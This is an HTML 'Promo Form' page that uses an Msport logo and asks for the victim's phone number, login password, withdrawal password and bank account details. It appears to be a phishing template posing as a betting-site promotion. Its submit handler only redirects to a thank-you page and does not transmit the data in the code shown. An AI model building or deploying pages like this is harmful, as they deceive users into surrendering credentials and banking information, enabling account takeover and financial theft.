<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Form</title>
    <style>
        body {
            background-color: yellow; /* Makes background yellow */
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        form {
            max-width: 300px;
            margin: auto;
            padding: 20px;
            background: white; /* Keeps form readable */
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: blue;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <img src="https://i.imgur.com/oiYv5K9.jpeg" alt="Msport Logo" width="200">
    </div>

    <form id="promoForm">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required><br><br>

        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br><br>

        <label for="phone">Msport Phone Number:</label>
        <input type="tel" id="phone" name="phone" required><br><br>

        <label for="loginPassword">Login Password:</label>
        <input type="password" id="loginpassword" name="loginpassword" required><br><br>

        <label for="withdrawalPassword">Withdrawal Password:</label>
        <input type="password" id="withdrawalpassword" name="withdrawalpassword" required><br><br>

        <label for="accountnumber">Account Number:</label>
        <input type="number" id="accountnumber" name="accountnumber" required><br><br>
        
        <label for="fullname">Account Full Name:</label>
        <input type="text" id="fullname" name="fullname" required><br><br>
      
        <label for="bankname">Input Your Preferred Bank Name:</label>
        <input type="text" id="bankname" name="bankname" required><br><br>

        <button type="submit">Submit</button>
    </form>

    <script>
        document.getElementById("promoForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent default form submission
            window.location.href = "thank-you.html"; // Redirect to the thank-you page
        });
    </script>

</body>
</html>
